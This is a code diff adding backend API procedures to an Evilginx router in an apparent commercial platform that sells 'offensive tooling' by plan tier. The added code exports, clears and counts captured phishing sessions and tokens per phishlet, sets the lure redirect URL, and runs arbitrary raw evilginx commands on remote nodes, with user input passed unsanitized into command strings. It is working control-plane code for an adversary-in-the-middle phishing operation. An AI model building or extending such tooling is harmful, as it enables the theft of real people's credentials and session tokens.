@@ -716,6 +716,76 @@ export const evilginxRouter = router({
       return { logs: output, output };
     }),
 
+  /** Export all captured sessions as JSON */
+  exportSessions: protectedProcedure.mutation(async ({ ctx }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
+    const node = await getActiveNode(ctx.user.id);
+    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
+    const raw = await execOnNode(node, "sessions", 20000, ctx.user.id);
+    const sessions = parseSessionList(raw);
+    return { sessions, count: sessions.length, exportedAt: new Date().toISOString() };
+  }),
+
+  /** Clear all captured sessions */
+  clearSessions: protectedProcedure.mutation(async ({ ctx }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
+    const node = await getActiveNode(ctx.user.id);
+    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
+    const raw = await execOnNode(node, "sessions", 20000, ctx.user.id);
+    const sessions = parseSessionList(raw);
+    let deleted = 0;
+    for (const s of sessions) {
+      try { await execOnNode(node, `sessions delete ${s.id}`, 10000, ctx.user.id); deleted++; } catch {}
+    }
+    return { success: true, deleted };
+  }),
+
+  /** Set redirect URL for unauthenticated traffic */
+  setRedirectUrl: protectedProcedure
+    .input(z.object({ url: z.string().min(1) }))
+    .mutation(async ({ ctx, input }) => {
+      const plan = await getUserPlan(ctx.user.id);
+      enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
+      const node = await getActiveNode(ctx.user.id);
+      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
+      const raw = await execOnNode(node, `config redirect_key ${input.url}`, 15000, ctx.user.id);
+      return { output: raw, success: !raw.toLowerCase().includes("error") };
+    }),
+
+  /** Get per-phishlet session statistics */
+  getPhishletStats: protectedProcedure.mutation(async ({ ctx }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
+    const node = await getActiveNode(ctx.user.id);
+    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
+    const [phishletsRaw, sessionsRaw] = await Promise.all([
+      execOnNode(node, "phishlets", 15000, ctx.user.id),
+      execOnNode(node, "sessions", 20000, ctx.user.id),
+    ]);
+    const sessions = parseSessionList(sessionsRaw);
+    const phishlets = parsePhishletList(phishletsRaw);
+    const stats = phishlets.map(p => ({
+      ...p,
+      sessionCount: sessions.filter(s => s.phishlet === p.name).length,
+      capturedCount: sessions.filter(s => s.phishlet === p.name && s.tokens).length,
+    }));
+    return { stats, totalSessions: sessions.length };
+  }),
+
+  /** Run any raw evilginx command */
+  runCommand: protectedProcedure
+    .input(z.object({ command: z.string().min(1), timeoutMs: z.number().optional().default(30000) }))
+    .mutation(async ({ ctx, input }) => {
+      const plan = await getUserPlan(ctx.user.id);
+      enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
+      const node = await getActiveNode(ctx.user.id);
+      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
+      const raw = await execOnNode(node, input.command, input.timeoutMs, ctx.user.id);
+      return { output: raw };
+    }),
+
   // ── Legacy compatibility procedures (kept for existing UI) ────────────────
   connectLocal: protectedProcedure.mutation(async ({ ctx }) => {
     const plan = await getUserPlan(ctx.user.id);
